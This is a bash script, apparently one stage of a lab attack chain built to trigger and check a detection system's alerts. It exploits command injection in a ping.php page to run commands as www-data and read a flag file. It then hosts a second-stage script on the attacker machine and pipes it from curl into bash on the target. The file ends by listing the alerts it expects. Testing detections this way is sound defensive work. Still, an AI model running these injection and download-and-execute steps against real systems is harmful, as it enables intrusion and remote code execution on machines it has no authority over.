#!/usr/bin/env bash
# Stage 3 — the second way in: command injection in ping.php. Either
# foothold (redis web shell or injection) yields www-data; this stage
# stays in the chain for the download-exec demo.
set -euo pipefail
. "$(dirname "$0")/lib.sh"

need curl "curl"
need python3 "payload server: python3 -m http.server"

check_target

say "confirming the injection: ping.php?ip=127.0.0.1;id"
rce 'id' | strip

say "reading the www-data flag"
rce 'cat /var/www/flag.txt' | strip

say "serving stage2.sh on $HOST_IP:8000 and pulling it onto the target"
STAGE=$(mktemp -d)
cleanup() {
  kill "$(cat "$STAGE/pid" 2>/dev/null)" 2>/dev/null || true
  rm -rf "$STAGE"
}
trap cleanup EXIT
cat > "$STAGE/stage2.sh" <<'EOF'
#!/bin/sh
# stage2 — post-exploitation recon
id
uname -a
ls -la /var/www
EOF
(
  cd "$STAGE"
  python3 -m http.server 8000 >/dev/null 2>&1 &
  echo $! >"$STAGE/pid"
)
# Poll until the server actually answers rather than assuming it is up
# after a fixed sleep — startup is occasionally slower than that.
up=0
for _ in $(seq 10); do
  if curl -sf -m 2 "http://$HOST_IP:8000/stage2.sh" >/dev/null; then up=1; break; fi
  sleep 0.5
done
[[ $up == 1 ]] || die "payload server did not come up on $HOST_IP:8000 (port busy?)"
rce "curl -s http://$HOST_IP:8000/stage2.sh | bash" | strip
trap - EXIT
cleanup

note "expected on the target:"
note "  process  CRITICAL flag-access — /var/www/flag.txt (custom rule)"
note "  process  HIGH    download-exec — curl piped into bash"
note "  process  INFO    every exec above (log_all_process_events)"
note "  network          outbound connection to $HOST_IP:8000"
